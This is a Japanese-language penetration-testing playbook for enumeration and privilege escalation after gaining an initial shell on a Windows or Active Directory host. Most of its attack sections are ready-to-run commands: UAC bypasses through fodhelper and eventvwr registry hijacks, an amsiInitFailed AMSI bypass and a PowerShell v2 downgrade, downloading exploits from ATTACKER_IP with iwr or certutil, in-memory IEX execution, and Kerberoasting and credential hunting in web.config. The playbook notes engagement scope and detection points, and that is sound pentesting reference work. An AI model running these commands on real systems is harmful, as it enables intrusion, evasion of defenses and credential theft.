# Windows 侵入後 列挙チェックリスト（AD・スタンドアロン共通）

> **スコープ**: 初期シェル取得直後の情報収集 → 次の権限昇格・横断移動の手法選択まで。各攻撃手法の手順は個別ファイル（`./ACE_Abuse/`・`./Kerberos_Attacks/`・`./Delegation_Attacks/`・`./NTLM_Relay/`）を参照。

## 着火条件

初期シェル（WinRM / SMB / RDP / Webシェル等）を取得した直後。

---

> **AD 環境か スタンドアロンかで優先度が変わる。**
> シェル取得直後の4手を打ち終えた後、`Get-ComputerInfo` の `Domain` 欄を確認する。
> - `Domain: WORKGROUP` → スタンドアロン。BloodHound（Step 2）はスキップ。Step 1.5 のローカルサービス確認を最優先にする。
> - `Domain: [ドメイン名]` → AD 参加済み。BloodHound による全体把握が最優先。

---

## 接続直後に打つコマンド（最初の4手）

シェルを取ったら何より先にこの4つを実行する。後続のステップ選択（CVE選択・BloodHound優先度・内部サービスの有無）に直結する。

```powershell
# 1. 自分が誰か・どの権限を持っているか（特権トークンの確認）
whoami /all

# 2. OSバージョン・ビルド番号（CVE選択に直結）・Domain欄でAD/スタンドアロン判定
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OSDisplayVersion, WindowsBuildLabEx, CsDomain

# 3. ネットワーク構成（他ホストへの経路・DNSサーバーの確認）
ipconfig /all

# 4. ローカルにしか公開されていないサービスの確認
# 【発想の起点】nmap が見えるのは「外から届くポート」だけ。
# シェルを取って初めて「内部でしかリスニングしていないサービス」が見える。
# このサービスがバージョンの古い脆弱なプロセスであれば、権限昇格の経路になる。
netstat -ano | findstr TCP | findstr ":0"
```

打ち終わったら：
1. Step 0 で `Get-ComputerInfo` の出力を読む（CVE 選定の起点・AD/スタンドアロン判定）
2. Step 1 で `whoami /all` の Privileges を読む（即昇格できる特権がないか）
3. Step 1.5 で `netstat` の出力を読む（`127.0.0.1:[PORT]` が LISTENING なら内部サービス確認）
4. **AD 環境の場合のみ** Step 2 で BloodHound を Linux 側から実行する

---

## Step 0: `Get-ComputerInfo` 出力の読み方

**最初の3コマンドで取得した OS 情報を読む。コマンドの再実行は不要。**

CVE の適用可否・攻撃手法の選択に直結するため、出力の各フィールドの意味を押さえる。

**`Get-ComputerInfo` とは何か：** PowerShell の組み込みコマンドレット。OS のバージョン・ビルド番号・Windows エディション・ドメイン所属・ハードウェア情報など、システム全体の情報を一括取得できる。引数なしで実行すると大量の出力が出るため、`Select-Object` で必要な項目に絞ること。

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|----------------|------|---------------|
| `WindowsProductName` がリリースから1年以内の最新OS（最新の Windows Server / Windows クライアント） | パッチ前提の新規CVEが残っている可能性 | ビルド番号と最新CVEを照合（後述の「新しいOSのCVE調べ方」） |
| 古いビルド番号（年単位で更新されていない） | 既知CVE多数の可能性 | `searchsploit` でビルド番号・KB番号を検索 |
| `WindowsInstallationType: Server Core` | GUIなし。PowerShell操作が前提 | GUI前提のコマンド・Explorer.exe 系は使えない |
| `Domain:` フィールドにドメイン名 | ドメイン参加済み | AD環境として Kerberos・LDAP の攻撃手法を検討 |
| `Domain:` が `WORKGROUP` | スタンドアロン | ローカル権限昇格に集中（AD攻撃は不要） |

**簡易確認（出力が少なくて速い）：**

```powershell
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"Domain" /C:"System Type"
```

### 新しいOS（searchsploit に載っていない場合）の CVE 調べ方

リリースから1年以内のOS・最新ビルドの場合、`searchsploit` には未掲載のことが多い。以下の順で探す：

1. **ベンダーのセキュリティブログ** — Akamai / SpecterOps / Microsoft MSRC / Trustedsec / Semperis 等
2. **GitHub** — `"CVE-202X-XXXXX" PoC`・`"[OS名] [機能名]" exploit` で検索。Star数・最終コミット日を確認
3. **X（旧Twitter）** — CVE番号で検索。研究者が PoC を最速で公開する場
4. **NVD** — `https://nvd.nist.gov/` で CPE と影響範囲を確認

→ 詳細: `../05_Tools_Reference/Searchsploit.md`（「Exploit-DB 以外の情報源と使い分け」セクション）

---

## Step 1: `whoami /all` 出力の読み方（特権トークンの確認）

**最初の3コマンドで取得した出力を読む。コマンドの再実行は不要。**

```powershell
# 必要に応じてドメインユーザーの追加情報を取得
net user [USERNAME] /domain   # ドメイン上のユーザー情報・最終ログオン・所属グループ
```

**着眼点 — Privileges 欄を最優先で確認する：**

| 特権 | 悪用方法 |
|------|---------|
| `SeImpersonatePrivilege` | Potato 系攻撃で SYSTEM に昇格 |
| `SeAssignPrimaryTokenPrivilege` | 同上 |
| `SeBackupPrivilege` | SAM / SYSTEM ハイブの読み取り |
| `SeRestorePrivilege` | 任意ファイルの書き込み |
| `SeMachineAccountPrivilege` | ドメインにコンピューターアカウントを追加可能 → **RBCD 攻撃** |
| `SeEnableDelegationPrivilege` | Unconstrained Delegation を設定可能 |
| `SeDebugPrivilege` | プロセスメモリへのアクセス → LSASS ダンプ |

→ 各特権の具体的な悪用手順（Potato系・SAMダンプ・LSASSダンプ）: `Privilege_Tokens.md`

---

## Step 1.3: UAC 状態確認と回避分岐

**攻撃者の思考トレース：** 中権限シェル（例：IIS アプリプール / 一般ユーザー）から SYSTEM に昇格する際、UAC（ユーザーアカウント制御）が壁になる。UAC レベルと自動昇格バイナリの有無を確認し、突破方法を選定する。UAC が無効または最低レベルの場合は UAC 回避ステップをスキップして直接昇格できる。

### UAC レベルの確認

```powershell
# [Target] ConsentPromptBehaviorAdmin 値で UAC レベルを判定
$uac = Get-ItemProperty `
  -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
  -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
$uac.ConsentPromptBehaviorAdmin
# 0 → UAC 無効（昇格なしで管理操作可能。UAC 回避ステップ不要）
# 1 → 安全なデスクトップ上で資格情報を要求（最も厳格）
# 2 → 安全なデスクトップ上で同意を要求（PromptForConsent）
# 5 → 通常の同意ダイアログ（デフォルト）
# その他 → ヘルプ参照（EnableLUA = 0 との組み合わせも確認）
```

```powershell
# [Target] EnableLUA も確認（0 の場合は UAC 自体が無効）
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA
# 0 → UAC 無効。管理者グループに入っていれば昇格操作は自由
# 1 → UAC 有効（ConsentPromptBehaviorAdmin の値を確認）
```

**何が出たら次に何をするか（UAC 確認）：**

| ConsentPromptBehaviorAdmin / EnableLUA | 判断・次のアクション |
|--------------------------------------|------------------|
| `EnableLUA = 0` / UAC 無効 | UAC 回避不要。管理者グループメンバーなら直接管理操作可能 |
| `ConsentPromptBehaviorAdmin = 0` | UAC ダイアログなし昇格。回避ステップをスキップできる |
| `ConsentPromptBehaviorAdmin = 5`（デフォルト） | 自動昇格バイナリを利用した UAC バイパスを試みる（下記参照） |
| `ConsentPromptBehaviorAdmin = 1 or 2` | 安全なデスクトップ。自動昇格バイナリも資格情報を要求されるため厳しい |

### UAC バイパス（自動昇格バイナリ悪用）

**着火条件：** `ConsentPromptBehaviorAdmin = 5`（デフォルト UAC）かつ、現在のユーザーが Administrators グループに入っている場合。

> **自動昇格バイナリとは：** Windows が「この EXE は信頼できる」として UAC ダイアログを出さずに高権限で動かすと判定するバイナリ（`aiostackinstaller.exe`、`fodhelper.exe`、`eventvwr.exe`、`sdclt.exe`、`cmstp.exe` 等）。これらはレジストリの特定キーを読み込む設計になっており、そのキーを書き換えることで任意コマンドを高権限で実行させる。

```powershell
# [Target] 方法 1 — fodhelper.exe を悪用（Windows 10 / Server 2016 以降で定番）
# HKCU 下のレジストリキーを作成・設定（標準ユーザー権限で書けるキー）
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty `
  -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "(Default)" `
  -Value "cmd /c [COMMAND]"   # [COMMAND]: 実行したいコマンド（例: whoami > C:\Windows\Temp\out.txt）
Set-ItemProperty `
  -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"
# 実行後、レジストリキーを削除する（原状回復）
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

```powershell
# [Target] 方法 2 — eventvwr.exe を悪用（Windows 10 初期から有効。古めの環境向け）
New-Item -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty `
  -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" `
  -Name "(Default)" `
  -Value "cmd /c [COMMAND]"
Start-Process "C:\Windows\System32\eventvwr.exe"
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

**事前準備（必須）：** 上記コマンドはターゲット上で実行する。リバースシェルが必要な場合は、実行前にテスター端末でリスナーを起動しておく（`nc -lvnp [PORT]`）。

**UACME / Metasploit モジュールの使い分け：**

| ツール | 用途・特徴 | 検知性 |
|--------|-----------|------|
| **UACME**（GitHub: hfiref0x/UACME） | 多数の UAC バイパス技法を番号で選択可能。C2 なしで単体動作 | EXE 自体が AV シグネチャ対象。転送後にブロックされる可能性あり |
| **Metasploit `exploit/windows/local/bypassuac_fodhelper`** | Metasploit セッション内で直接実行可能 | プロセスツリー・ペイロードが EDR 検知対象 |
| **手動レジストリ操作**（上記） | ツール不要。PowerShell のみで完結 | 検知性は中程度。AMSI バイパスと組み合わせて使うことが多い |

**原状回復（必須）：**

```powershell
# [Target] 使用したレジストリキーを削除（fodhelper バイパス後）
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
# eventvwr バイパス後
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

### 刺さらなかったとき（UAC バイパス）

| 現象 | 原因 | 代替 |
|------|------|------|
| `fodhelper` 実行してもコマンドが動かない | Windows 11 / 最新パッチで修正済み | `sdclt.exe` バイパス（UACME #61 等）を試す |
| レジストリキーへの書き込みが拒否される | AppLocker / WDAC が HKCU 書き込みを制限している | UACME の別技法 / Metasploit モジュールを試す |
| `ConsentPromptBehaviorAdmin = 1` または `2` | 安全なデスクトップ上でのプロンプト。バイパス困難 | 資格情報スプレー・SeImpersonate 等の別経路へ切り替える |
| Administrators グループに入っていない | 前提条件不成立 | SeImpersonate 等の低権限からの昇格手法を先に試す |

> **本番の注意点：** UAC バイパス自体は Sysmon Event ID 13（RegistryEvent: HKCU\Software\Classes 下の書き込み）で検知される。Defender for Endpoint は `bypassuac_` 系の挙動パターンを「UAC modification」として検知する。合意範囲内であることを確認してから実施する。

---

## Step 1.5: ローカルにしか公開されていないサービスの発見

nmap では外部から見えなかったサービスが、内部ではリスニングしている場合がある。
**`netstat` で確認し、ポート番号から何のサービスか特定する。**

**攻撃者の思考トレース：** 初期アクセスで露出していたポートは「外に公開している部分」にすぎない。
内部にしか繋がれていないサービス（バージョンが古い管理ツール・開発環境・内部DB等）を
ポートフォワーディングで手元に引き込むことで追加の攻撃面が生まれる。

```powershell
# [Target] ローカルでリスニングしているTCPポートを確認
netstat -ano | findstr TCP | findstr ":0"
# 出力例：
# TCP    127.0.0.1:8888    0.0.0.0:0    LISTENING    8856
#                ^^^^                                  ^^^
#          ローカルのみリスニング中              プロセスID (PID)

# PIDからプロセス名を特定
tasklist /FI "PID eq [PID]"
# 例：PID 8856 → [SERVICE_NAME].exe
```

**出力の読み方：**

| 出力パターン | 意味 | 次のアクション |
|------------|------|--------------|
| `127.0.0.1:[PORT]` が LISTENING | ローカルにのみ公開。外部から直接アクセス不可 | `tasklist` で PID を特定 → サービス名を検索 → 脆弱なバージョンなら searchsploit |
| `0.0.0.0:[PORT]` が LISTENING | 全インターフェース公開。nmap で既に見えているはず | nmap スキャン結果と照合して抜け漏れを確認 |
| `[::]:PORT` が LISTENING | IPv6 で全インターフェース公開 | 同上 |

**インストール済みソフトウェアの確認（バージョン特定）：**

```powershell
# [Target] インストール済みソフトウェアの一覧
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize

# または Downloads・Program Files を直接確認
dir C:\Users\[USER]\Downloads
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

ローカルにしか公開されていないサービスに脆弱なバージョンがある場合 → **ポートフォワーディングで手元に引き込んで攻撃する**
→ Chisel を使ったポートフォワーディング: `../05_Tools_Reference/Chisel.md`
→ Exploit-DB PoC を使った Buffer Overflow: `Buffer_Overflow_LocalService.md`

---

## Step 2: BloodHound でAD全体を把握（最重要）

> **`Windows_AD_Attack_Flow.md` Step 3.5 の段階で既に Linux 側で実行済みであれば、ここでは結果の確認だけでよい。** BloodHound は Windows シェル内ではなく **Linux（攻撃側）から1回実行するだけ** が正解。Windows シェル経由で何かを打ち直す必要はない。

```bash
# [Attacker] 未実行の場合のみ。テスター端末から実行
bloodhound-python -u [USER] -p '[PASSWORD]' -ns [DC_IP] -d [DOMAIN] -c All
# [DC_IP] は単一ホスト構成では [IP] と同じ。AD が複数DCで分散している場合のみ DC のIP を別途指定する
```

**BloodHound で確認すべき項目（GUI で）：**
1. 「Shortest Paths to Domain Admins」→ 現在のユーザーから Domain Admins への最短ルート
2. 「Find All Domain Admins」→ DA メンバーの把握
3. 「Find Principals with DCSync Rights」→ DCSync が可能なアカウント
4. 現在のユーザー・所属グループが持つ ACE（アクセス制御エントリ）

→ 詳細: `../05_Tools_Reference/BloodHound.md`

---

## Step 3: グループとメンバーシップの確認

```powershell
# 所属グループの確認
net user [USERNAME] /domain

# Domain Admins のメンバー
net group "Domain Admins" /domain

# 高権限グループの確認
net group "Enterprise Admins" /domain
net group "Account Operators" /domain
net group "Backup Operators" /domain
```

---

## Step 4: コンピューターアカウントの列挙

```bash
# Linux 側から
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --computers
```

**着眼点：** Unconstrained Delegation が設定されたコンピューターを探す。

---

## Step 5: Kerberoastable / ASREPRoastable アカウントの確認

```bash
# Kerberoastable（SPN付きアカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --kerberoasting output.txt

# ASREPRoastable（事前認証不要アカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast output.txt
```

→ 詳細: `./Kerberos_Attacks/Kerberoasting.md`, `./Kerberos_Attacks/ASREPRoasting.md`

---

## Step 6: SYSVOL / NETLOGON の確認

```bash
smbclient //[IP]/SYSVOL -U '[DOMAIN]\[USER]%[PASSWORD]' -c "recurse ON; ls"
```

認証済みユーザーとして SYSVOL にアクセスし、スクリプトに他ユーザーの認証情報が含まれていないか確認する。匿名アクセス時に見逃した内容も、認証済みなら追加で取れることがある。

→ 詳細: `../01_Reconnaissance/SMB_Enumeration.md`

---

## Step 7: Webアプリのソースコード確認（IIS環境）

nmap スキャンで 80/443 が開いていた場合、IIS の Web ルートにアプリのソースコードが置かれていることがある。**認証情報・DB接続文字列・ロジックの把握**に使う。

```powershell
# IIS のデフォルト Web ルートを確認
ls C:\inetpub\

# アプリのファイルを確認（app.py、web.config 等）
ls C:\inetpub\[サイト名]\

# web.config に DB 接続文字列・パスワードが埋め込まれていることがある
type C:\inetpub\[サイト名]\web.config

# Python/Flask アプリの場合はメインスクリプトを確認
type C:\inetpub\[サイト名]\app.py
```

**`inetpub` とは何か：** IIS（Internet Information Services、Windows 標準の Web サーバー）のデフォルトルートディレクトリ。`C:\inetpub\wwwroot` がデフォルト公開フォルダだが、複数サイトを運用している場合はサイト名のサブフォルダが作られる。Webアプリが稼働しているサーバーでは必ず確認する。

**着眼点：**

- `web.config` に DB 接続文字列・パスワード・API キーが平文で書かれていることがある
- `app.py` / `*.py` / `*.php` 等のソースからパスワードハッシュのアルゴリズムが判明する（クラックのモード選択に使う）
- アプリの認証ロジックを読むことでバイパス方法が見つかる場合がある

### Windows シェルでのディレクトリ一覧コマンドの使い分け

`ls`（PowerShell の `Get-ChildItem` のエイリアス）以外にも目的別の選択肢がある。**特に「ファイル構造を一目で把握する」用途では `tree /f` が圧倒的に見やすい。**

| コマンド | 用途 | 特徴 |
|---------|------|------|
| `ls` / `Get-ChildItem` | 単一ディレクトリの確認 | PowerShell 標準。サイズ・タイムスタンプが見やすい |
| `Get-ChildItem -Recurse -Force` | 隠しファイル含む全再帰列挙 | 大きいフォルダで時間がかかる。`-Filter` で絞る |
| `tree /f` | フォルダ構造をツリー表示 | cmd.exe コマンド。**構造把握に最適** |
| `tree /f /a` | ASCII 文字でツリー表示 | 文字化け回避。コピペ・記録用 |
| `dir /s /b` | 再帰でフルパスのみ列挙 | grep に流しやすい（`dir /s /b \| findstr "config"`） |

```powershell
# 構造を見る（一番便利）
tree /f C:\inetpub

# 特定の文字列を含むファイルを探す
dir /s /b C:\ | findstr /i "config.json web.config .kdbx"
```

---

## Step 7.5: PSSession による別ユーザーとしての横断移動

**着火条件：** GenericAll / ForcePasswordChange / KeePass からの認証情報等で **別のドメインユーザーのパスワードが判明**しており、そのユーザーとして操作したい場合。または WinRM 直接接続でなく、**ローカルループバック（127.0.0.1）経由で PSSession を張る**必要がある場合。

> **PSSession とは：** PowerShell Remoting（WinRM 上で動作）を使って別の Windows ホストまたは別ユーザーのコンテキストでコマンドを実行できる仕組み。`New-PSSession` でセッションを作成し、`Enter-PSSession` で対話操作、`Invoke-Command` でコマンドを送り込む。

**攻撃者の思考トレース：** evil-winrm でのリモートシェルは「外から入る」経路。PSSession の 127.0.0.1 接続は「ターゲット内部で別ユーザーに乗り換える」経路。WinRM が外部から閉じていても内部では使えることが多い。

### 別ユーザーとして対話シェルに入る

```powershell
# [Target] 移行先ユーザーの認証情報を作成
$pass = ConvertTo-SecureString -AsPlainText -Force '[TARGET_USER_PASSWORD]'
$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)

# セッション作成・接続
$session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
Enter-PSSession -Session $session

# 確認
whoami    # → DOMAIN\TARGET_USER になっていることを確認
```

### 別ユーザーとしてコマンドを1回実行（対話不要な場合）

```powershell
# [Target] Invoke-Command で単発実行（セッションを作らずに済む）
$pass = ConvertTo-SecureString '[TARGET_USER_PASSWORD]' -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)
Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
# → 確認後、必要なコマンドを ScriptBlock 内に入れる
```

**PSSession で確認すべき事項（別ユーザーになったら最初に実行）：**

```powershell
# [Target/PSSession] 権限の確認
whoami /all

# グループ所属（次の権限昇格の手掛かり）
net user [TARGET_USER] /domain

# このユーザーのデスクトップ・ドキュメントに何があるか
dir C:\Users\[TARGET_USER]\Desktop
dir C:\Users\[TARGET_USER]\Documents

# BloodHound で次のエッジを確認（別ウィンドウ）
# → このユーザーの次の GenericAll / ForcePasswordChange / WriteDACL 等を確認する
```

### PSSession の終了と次のユーザーへの移行

```powershell
# [Target] PSSession を終了して1つ前のセッションに戻る
exit

# → 戻ったセッションから次のユーザーへの操作を実行する
```

**注意点：**

- PSSession を多段で積み上げると混乱する。`whoami` で常に現在のユーザーを確認する
- ループバック（`127.0.0.1`）接続が失敗する場合は、WinRM のローカルループバック許可を確認: `winrm get winrm/config/client`

---

## Step 8: Windows PoC の取得・転送・実行（CVE悪用が必要な場合）

CVE の悪用に PoC（概念実証コード）が必要な場合の手順。Linux の場合は `wget` + `make` が基本だが、Windows では転送手段が異なる。

### evil-winrm でのファイルアップロード

evil-winrm には組み込みのファイル転送機能がある。

```bash
# [Attacker] evil-winrm 接続時に転送用ディレクトリを指定する
evil-winrm -i [IP] -u [USER] -p '[PASSWORD]' \
  -s /path/to/scripts/   # PowerShellスクリプトを読み込むディレクトリ
```

```powershell
# [evil-winrm シェル内] ローカルファイルをターゲットにアップロード
upload /path/on/attacker/exploit.exe C:\Windows\Temp\exploit.exe

# ダウンロード（ターゲットからテスター端末へ）
download C:\Users\admin\file.txt /path/on/attacker/file.txt
```

### PowerShell でのダウンロード（テスター端末で HTTP サーバーを起動）

```bash
# [Attacker] HTTP サーバーを起動してファイルを配信
cd /path/to/exploit/
python3 -m http.server 8888
# テスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う: ip a
```

```powershell
# [ターゲット] PowerShell でダウンロード
Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"

# または短縮形（エイリアス）
iwr "http://[ATTACKER_IP]:8888/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"

# certutil を使う方法（PowerShell が制限されている場合の代替）
certutil -urlcache -f http://[ATTACKER_IP]:8888/exploit.exe C:\Windows\Temp\exploit.exe
```

### PowerShell スクリプト（.ps1）をメモリ上で実行

ファイルを書き込まずにメモリ上で直接実行する手法。アンチウイルスによる検知を回避しやすい。

```powershell
# [ターゲット] スクリプトをメモリ上でダウンロードして実行（IEX）
IEX (Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.ps1" -UseBasicParsing).Content
```

### CVE の調べ方（PoC を探す前に）

> **Metasploit セッションがあるなら**、まず `local_exploit_suggester` でローカル昇格候補を自動列挙すると速い（`sysinfo` で arch を確認 → x86 は判定が比較的信頼できる）。使い方・local exploit モジュールの実行・書込可能 cwd の罠 → `../05_Tools_Reference/Metasploit.md`（§7）。

```bash
# [Attacker] バージョン情報からCVEを検索
searchsploit windows server [年]
searchsploit [技術名] [バージョン]

# GitHub での PoC 検索
# GitHub で "CVE-[年]-[番号] PoC" または "CVE-[年]-[番号] exploit" を検索
# Star数・コミット日時・README の前提条件を確認してから使う
```

→ CVE の絞り込み基準・新しい OS 用の調べ方の詳細 → `../05_Tools_Reference/Searchsploit.md`（「searchsploit が0件のときのフロー」）

**注意点・落とし穴：**

- 実行前に `C:\Windows\Temp` への書き込み権限があるか確認する（`echo test > C:\Windows\Temp\test.txt`）
- PowerShell の実行ポリシーが `Restricted` の場合は `.ps1` を直接実行できない。`IEX` 経由か `powershell -ExecutionPolicy Bypass -File exploit.ps1` で回避
- GitHub から落とした PoC は README で**前提条件**（OS バージョン・権限・必要なグループ）を必ず確認してから実行する
- 新しいバージョンの Windows Server / Windows クライアントには新しいセキュリティ機構（Windows Defender・AMSI 等）が有効なことが多い。エラーが出た場合は下記 AMSI バイパスを検討する

---

### AMSI バイパス（PowerShell スクリプトがブロックされる場合）

**着火条件：** PowerShell スクリプト（`.ps1`）や `IEX` 経由のコードが AMSI によってブロックされる場合。Windows Defender 等が「Invoke-Expression がマルウェアを含んでいる可能性がある」として停止させる。

> **AMSI（Antimalware Scan Interface）とは：** Windows 10 以降に搭載された API。PowerShell / VBScript / WScript 等がスクリプトを実行する直前に AV エンジンに内容を渡してスキャンさせる仕組み。ファイル書き込みなしでもメモリ上のスクリプト内容を検査できる。

**攻撃者の思考トレース：** AMSI が有効な環境で `.ps1` を直接実行するとブロックされる。AMSI は `amsi.dll` として PowerShell プロセスにロードされているため、そのメモリ上の `AmsiScanBuffer` 関数をパッチして無効化する手法が広く使われる。ただし本番ではパッチ方式は EDR がトリップレットするため、Downgrade Attack（PowerShell v2）が相対的に低リスクな場合がある。

#### AMSI の有効状態確認

```powershell
# [Target] AMSI ユーティリティクラスがロードされているか確認（PS v5.1 環境向け）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# クラスが返ってくる → AMSI が有効な PowerShell 5.x 環境
# 例外が出る → PowerShell v2（AMSI 非搭載）または既にバイパス済み
```

#### 方法 1 — PowerShell Downgrade Attack（PS v2 へのダウングレード）

**検知性：低〜中。EDR では「PowerShell v2 の起動」が怪しいシグナルとして記録されることがある。**
本番では `amsi.dll` メモリパッチより相対的にリスクが低い。

```powershell
# [Target] PowerShell v2 で起動（AMSI は v3 以降に搭載されたため v2 には存在しない）
powershell -Version 2 -Command { [YOUR_COMMAND_HERE] }
# または対話シェル起動
powershell -Version 2
```

**事前確認（必須）：** v2 が使えるかどうかを確認する。

```powershell
# [Target] .NET Framework 2.0 のインストール確認（PS v2 の依存）
Get-WindowsFeature -Name PowerShell-V2 2>$null
# または
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine").PowerShellVersion
# 2.0 が返ってくれば v2 が利用可能
```

**刺さらなかったとき：** Windows Server 2019 / Windows 11 以降では PS v2 が削除されていることが多い。その場合は方法 2 または 3 を検討する。

#### 方法 2 — AmsiScanBuffer メモリパッチ

> **[HIGH IMPACT]** ETW パッチ・AMSI メモリパッチはカーネルレベルの EDR（CrowdStrike / SentinelOne 等）で「Suspicious AMSI patch」として確実に検知される。本番では事前合意が必要。**EDR が有効な環境での実施は最高リスク扱い**。

```powershell
# [Target] AmsiScanBuffer を常に「スキャン結果 = 0（クリーン）」に書き換えるパッチ
# ※ このコード自体が AMSI にブロックされるため、文字列を分割・エンコードして渡す必要がある
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
# amsiInitFailed を true にして AMSI 初期化失敗を模倣する（軽量な回避方法）
```

**実際の本番での注意：** 上記コードそのまま貼り付けてもAMSI自身に検知されてブロックされる。文字列を ROT13・base64・変数分割などで難読化してからペーストする必要がある。難読化コードの生成方法は都度変わるため、ツール（Invoke-Obfuscation 等）または手動分割を使う。

#### 方法 3 — ETW 無効化との組み合わせ

> **ETW（Event Tracing for Windows）** はEDR がリアルタイムで PowerShell の動作ログを取得するチャネル。ETW 無効化は AMSI バイパスより検知リスクが高く、**本番では原則としてETW パッチは禁止操作として扱うこと。**

```powershell
# [Target] ETW の PowerShell プロバイダを無効化（NtTraceEvent をパッチ）
# ※ 高リスク操作。EDR が必ず検知する。本番では事前書面合意がない限り実施しない
[Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null
$etwpatch = [System.Runtime.InteropServices.Marshal]
# ... (実装は省略。本番ではこの手法は事前合意なしに使用しない)
```

#### AMSI バイパスの検知観点と本番での扱い

| 方法 | Sysmon / EDR 検知 | 本番リスク |
|------|-----------------|-------------|
| PowerShell v2 Downgrade | Sysmon Event ID 1（PS v2 起動）/ Defender「PowerShell downgrade attack」 | 中（使用前に合意推奨） |
| `amsiInitFailed` パッチ | EDR「AMSI bypass attempt」/ Sysmon Event ID 10（PS への自己プロセスアクセス） | 高（書面合意必須） |
| ETW パッチ | EDR「ETW tampering」/ Sysmon Event ID 8（CreateRemoteThread to ntdll.dll） | 最高（本番では原則禁止） |

**本番での結論：** AMSI が壁になる場合は、まず **PowerShell v2 Downgrade** を試みる。それも使えない環境（PS v2 削除済み・Defender が v2 も監視）では、**ツール選択を変える**（PoC を C# バイナリにコンパイルして直接 EXE 実行 → AMSI は PS スクリプトを対象とするため）か、**実施範囲を対象組織に再確認**する。

---

## 刺さらなかったとき

| 状況 | 対応 |
|------|------|
| `whoami /all` で有効な特権トークンがない | Step 1.3 の UAC バイパス・Step 1.5 のローカルサービス確認に集中する |
| BloodHound で DA へのパスが見つからない | 現在のユーザーの所属グループを確認し、間接的な ACE（GenericAll 経由等）を探す |
| すべての Kerberoast / ASREP ハッシュがクラックできない | パスワードスプレーや別ユーザーへの ACE Abuse を検討する |
| 内部サービスが見つからない（netstat が空） | SMB 共有・SYSVOL のスクリプト確認・Web アプリのソースコード確認（Step 7）に移行する |
| BloodHound がデータを収集できない | DC への LDAP アクセスを確認。`bloodhound-python` の `-ns` オプションで DNS サーバーを指定する |

---

## 関連技術
- 前：WinRM シェルの取得 → `../02_Initial_Access/WinRM.md`
- 前：パスワードスプレーで初期シェル取得 → `../00_Playbook/Windows_AD_Attack_Flow.md`（Step 3.5）
- 後：BloodHound で GenericAll が判明 → `./ACE_Abuse/GenericAll.md`
- 後：BloodHound で GenericWrite が判明 → `./ACE_Abuse/GenericWrite.md`
- 後：BloodHound で WriteDACL が判明 → `./ACE_Abuse/WriteDACL.md`
- 後：BloodHound で ForceChangePassword が判明 → `./ACE_Abuse/ForcePasswordChange.md`
- 後：SeMachineAccountPrivilege がある → `./Delegation_Attacks/RBCD.md`
- 後：SeEnableDelegationPrivilege がある → `./Delegation_Attacks/Unconstrained.md`
- 後：Kerberoastable アカウントがある → `./Kerberos_Attacks/Kerberoasting.md`
- 後：CVE の絞り込み・PoC の探し方 → `../05_Tools_Reference/Searchsploit.md`
- 後：UAC バイパスで SYSTEM に昇格後 → `./Privilege_Tokens.md`（SeImpersonate / Potato系）
- 後：EDR がカーネルレベルで動作しており PS / EXE をすべてブロックする → `./BYOVD.md`
